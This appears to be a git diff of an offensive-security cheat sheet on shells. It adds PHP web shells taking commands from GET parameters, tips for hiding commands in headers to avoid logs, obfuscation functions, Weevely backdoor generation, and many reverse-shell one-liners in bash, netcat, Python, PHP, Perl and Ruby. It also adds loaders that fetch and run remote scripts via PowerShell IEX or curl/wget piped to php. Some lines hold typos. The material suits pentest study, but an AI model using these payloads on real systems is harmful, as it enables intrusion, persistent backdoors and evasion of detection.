@@ -1,6 +1,6 @@
 # General - Shells
 
-### Detect firewalls
+### Detect packets filtering
 
 ###### Outgoing traffic blocking
 
@@ -22,13 +22,80 @@ python -c 'import os;  os.popen("ping -c 4 <IP> &");"
 
 If ICMP packets are received but TCP packets aren't then TCP may be blocked.
 
-### Bind Shells
+### Web Shells
 
-TODO
+###### PHP
 
+**Basic**  
+
+Basic PHP code to execute system commands through GET parameters:
+
+```php
+<?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
+<?php if($_GET['cmd']) { exec($_GET['cmd']),$array); print_r($array); } ?>
+<?php if($_GET['cmd']) { echo shell_exec($_GET['cmd']); } ?>
+<?php if($_GET['cmd']) { echo passsthru($_GET['cmd']); } ?>
+<?php if($_GET['cmd']) { preg_replace('/.*/e', $_GET['cmd'], ''); } ?>
+```
+
+**Stealthy**  
+
+Instead of passing the commands through the URL, which would appear in logs,
+header-paramters can be used.
+
+```php
+$_SERVER['HTTP_ACCEPT_LANGUAGE']
+$_SERVER['HTTP_USER_AGENT']
+```
+
+**Obfuscation**  
+
+The following functions can be used to obfuscate the code.
+
+```php
+eval()
+assert()
+base64()
+gzdeflate()
+str_rot13()
+```
+
+**phpbash**  
+
+phpbash is a simple standalone, semi-interactive web shell.  
+Upload the phpbash.php or phpbash.min.php file on the target and access it
+with any Javascript-enabled web browser to achieve RCE.
+
+https://github.com/Arrexel/phpbash
+
+**Weevely**  
+
+Weevely is a password protected web shell designed for post-exploitation
+purposes that can be extended over the network at runtime.
+
+Upload weevely PHP agent to a target web server to get remote shell access to
+it. It has more than 30 modules to assist administrative tasks, maintain access,
+provide situational awareness, elevate privileges, and spread into the target
+network.  
+The agent is a small, polymorphic PHP script hardly detected by AV and the
+communication protocol is obfuscated within HTTP requests.
+
+```bash
+# Generate the backdoor agent
+./weevely.py generate mypassword agent.php
+Generated backdoor with password 'mypassword' in 'agent.php' of 671 byte size.
+
+# Upload the generated agent under the target web folder.
+# Make sure that the agent URL is reachable from your position and that it is correctly executed by the web server as PHP code.
+
+# Connect to the agent
+./weevely.py http://<TARGET>/agent.php mypassword
+weevely>
+```
 ### Reverse Shells
 
 ###### Setup a listener on host
+
 ```
 # TCP
 nc -lvnp <PORT>
@@ -40,22 +107,28 @@ nc -lvnpu <PORT>
 python icmpsh_m.py <HOST_IP> <TARGET_IP>
 ```
 
-###### Execute reverse shell command  
+###### One-liners reverse shell commands
 
 **Bash**
+
 ```bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done
+exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
+0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
 ```
 
 **Netcat**
+
 ```bash
-# If nc e option:
+# If nc e option available:
 nc -e /bin/sh <IP> <PORT> &
 # Else:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
 ```
 
 **Python**
+
 ```python
 # TCP
 python -c 'import os;  os.popen("nc -e /bin/sh <IP> <PORT> &");"
@@ -63,15 +136,46 @@ python -c 'import os;  os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-**Powershell**  
-The Nishang powershell scripts can be used to get a reverse shell.  
+
+**PHP**   
+
+```php
+# This code assumes that the TCP connection uses file descriptor 3.
+# If it doesn’t work, try 4, 5, 6…
+php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+```
+
+**Perl**
+
+```perl
+perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+**Ruby**
+
+```ruby
+ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+###### In memory scripts injection
+
 The scripts needs to be hosted on a webserver, which can be done using
 python:
+
 ```python
 python -m SimpleHTTPServer <PORT>
 ```
+
+**Powershell**  
+
+The Nishang powershell scripts can be used to get a reverse shell. https://github.com/samratashok/nishang  
 The following commands will load directly in memory the powershell script hosted
 on the remote webserver:
+
 ```powershell
 # TCP
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>
@@ -80,21 +184,20 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>
 ```
 
-**PHP**
+**PHP**  
+
+The pentestmonkeys php-reverse-shell script can be used to leverage a reverse
+shell.  
+https://github.com/pentestmonkey/php-reverse-shell
+The following commands will load directly in memory the script hosted
+on the remote webserver and execute it:
+
 ```php
-# This code assumes that the TCP connection uses file descriptor 3.
-# If it doesn’t work, try 4, 5, 6…
-php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-**Perl**
-```perl
-perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
+system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
 ```
 
-**Ruby**
-```ruby
-ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-```
+The *system* call be remplaced with various PHP functionalities detailed above.  
 
 ###### Optional - Get TTY
 
